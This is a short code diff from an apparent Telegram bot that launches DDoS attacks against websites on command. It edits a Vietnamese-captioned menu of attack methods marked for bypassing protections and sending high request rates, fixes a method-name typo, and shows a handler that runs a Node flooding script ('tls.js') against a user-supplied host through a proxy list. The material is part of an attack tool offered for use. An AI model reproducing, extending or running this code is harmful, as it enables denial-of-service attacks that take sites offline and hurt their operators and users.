@@ -157,8 +157,8 @@ CHỈ TAY LÊN TRỜI HẬN ĐỜI VÔ ĐỐI
 │MIX bypass high rqs
 │HTTPS https ddos:)
 │DESTROY high rqs not destroy site:)
-│GECKO bypass medium rqs
-│OCE ok method;)
+│GECKO bypass medium rqs(error)
+│OCE ok method;)(error)
 
 │ Methods List Layer 4 (update)
 │ Auto update proxy (soon)
@@ -219,7 +219,7 @@ def attack_command(message):
                 bot.reply_to(message, f"Không Được Phép Tấn Công Trang Web Có Tên Miền {blocked_domain}")
                 return
 
-    if method in ['TLS', 'RAPID', 'BYPASS', 'RAW', 'HYDRA', 'HTTPS', 'MIX', 'DESROY','GECKO','OCE']:
+    if method in ['TLS', 'RAPID', 'BYPASS', 'RAW', 'HYDRA', 'HTTPS', 'MIX', 'DESTROY','GECKO','OCE']:
         # Update the command and duration based on the selected method
         if method == 'TLS':
             command = ["node", "tls.js", host, "90", "64", "7", "live.txt"]
